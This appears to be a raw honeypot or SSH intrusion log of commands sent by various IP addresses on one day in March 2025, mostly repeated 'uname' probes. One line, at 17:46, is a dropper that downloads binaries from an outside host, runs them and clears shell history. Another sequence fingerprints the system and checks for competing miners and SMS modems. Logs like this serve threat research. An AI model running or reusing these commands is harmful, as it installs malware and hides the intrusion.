+2025-03-18 14:48:50 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:48:53 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:49:00 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:49:15 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:49:17 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:49:20 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:49:31 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:49:33 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:49:37 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:49:48 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:49:50 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:49:52 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:49:59 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:50:01 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:50:02 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:50:07 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:50:08 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:50:14 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:50:21 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:50:26 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:50:27 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:50:42 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:50:51 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:50:54 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:51:00 from 165.154.0.218: uname -s -v -n -r -m
+2025-03-18 14:58:21 from 185.126.158.152: uname -s -v -n -r -m
+2025-03-18 15:00:22 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:00:28 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:00:33 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:00:35 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:00:56 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:00:57 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:01:02 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:01:08 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:01:43 from 160.124.98.13: uname -s -m
+2025-03-18 15:04:23 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:04:24 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:04:32 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:04:37 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:06:42 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:06:44 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:07:19 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:07:19 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:20:54 from 103.14.27.233: uname -a
+2025-03-18 15:23:49 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:23:52 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:26:35 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:26:39 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:28:54 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:28:56 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:31:18 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 15:31:19 from 168.235.79.61: uname -s -v -n -r -m
+2025-03-18 16:06:07 from 185.126.158.152: uname -s -v -n -r -m
+2025-03-18 16:21:34 from 103.186.101.191: uname -s -v -n -r -m
+2025-03-18 16:31:54 from 103.186.101.191: uname -s -v -n -r -m
+2025-03-18 17:03:04 from 103.186.101.191: uname -s -v -n -r -m
+2025-03-18 17:04:56 from 209.38.30.136: uname -s -v -n -r -m
+2025-03-18 17:05:15 from 209.38.30.136: uname -s -v -n -r -m
+2025-03-18 17:06:44 from 209.38.30.136: uname -s -v -n -r -m
+2025-03-18 17:07:53 from 209.38.30.136: uname -s -v -n -r -m
+2025-03-18 17:07:57 from 209.38.30.136: uname -s -v -n -r -m
+2025-03-18 17:08:34 from 209.38.30.136: uname -s -v -n -r -m
+2025-03-18 17:08:47 from 209.38.30.136: uname -s -v -n -r -m
+2025-03-18 17:10:24 from 209.38.30.136: uname -s -v -n -r -m
+2025-03-18 17:11:01 from 209.38.30.136: uname -s -v -n -r -m
+2025-03-18 17:11:20 from 209.38.30.136: uname -s -v -n -r -m
+2025-03-18 17:12:01 from 209.38.30.136: uname -s -v -n -r -m
+2025-03-18 17:12:05 from 209.38.30.136: uname -s -v -n -r -m
+2025-03-18 17:12:51 from 209.38.30.136: uname -s -v -n -r -m
+2025-03-18 17:12:55 from 209.38.30.136: uname -s -v -n -r -m
+2025-03-18 17:13:19 from 209.38.30.136: uname -s -v -n -r -m
+2025-03-18 17:13:23 from 103.186.101.191: uname -s -v -n -r -m
+2025-03-18 17:13:41 from 209.38.30.136: uname -s -v -n -r -m
+2025-03-18 17:15:23 from 209.38.30.136: uname -s -v -n -r -m
+2025-03-18 17:17:37 from 209.38.30.136: uname -s -v -n -r -m
+2025-03-18 17:18:14 from 209.38.30.136: uname -s -v -n -r -m
+2025-03-18 17:18:32 from 209.38.30.136: uname -s -v -n -r -m
+2025-03-18 17:22:07 from 209.38.30.136: uname -s -v -n -r -m
+2025-03-18 17:22:13 from 173.212.231.185: uname -s -m
+2025-03-18 17:46:29 from 218.92.0.131: #!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://43.249.172.195:888/112; curl -O http://43.249.172.195:888/112; chmod +x 112; ./112; wget http://43.249.172.195:888/112s; curl -O http://43.249.172.195:888/112s; chmod +x 112s; ./112s; rm -rf 112.sh; rm -rf 112; rm -rf 112s; history -c
+2025-03-18 17:48:00 from 218.92.0.131: /bin/eyshcjdmzg
+2025-03-18 17:48:01 from 218.92.0.131: ls -la /var/run/gcc.pid
+2025-03-18 18:09:59 from 185.126.158.152: uname -s -v -n -r -m
+2025-03-18 18:56:56 from 103.186.101.191: uname -s -v -n -r -m
+2025-03-18 19:06:13 from 185.126.158.152: uname -s -v -n -r -m
+2025-03-18 20:02:37 from 185.126.158.152: uname -s -v -n -r -m
+2025-03-18 20:50:44 from 103.186.101.191: uname -s -v -n -r -m
+2025-03-18 20:57:34 from 183.66.17.82: uname -a
+2025-03-18 20:59:01 from 185.126.158.152: uname -s -v -n -r -m
+2025-03-18 21:10:21 from 185.126.158.152: uname -s -v -n -r -m
+2025-03-18 21:11:12 from 103.186.101.191: uname -s -v -n -r -m
+2025-03-18 21:15:33 from 101.201.61.225: uname -s -v -n -r -m
+2025-03-18 21:15:48 from 101.201.61.225: uname -s -v -n -r -m
+2025-03-18 21:21:49 from 103.186.101.191: uname -s -v -n -r -m
+2025-03-18 22:22:50 from 47.243.227.167: uname -s -v -n -r -m
+2025-03-18 23:51:47 from 49.160.87.101: /ip cloud print
+2025-03-18 23:51:48 from 49.160.87.101: ifconfig
+2025-03-18 23:51:48 from 49.160.87.101: uname -a
+2025-03-18 23:51:48 from 49.160.87.101: cat /proc/cpuinfo
+2025-03-18 23:51:49 from 49.160.87.101: ps | grep '[Mm]iner'
+2025-03-18 23:51:49 from 49.160.87.101: ps -ef | grep '[Mm]iner'
+2025-03-18 23:51:50 from 49.160.87.101: ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
+2025-03-18 23:51:50 from 49.160.87.101: echo Hi | cat -n
+2025-03-18 23:56:49 from 157.230.125.68: uname -a
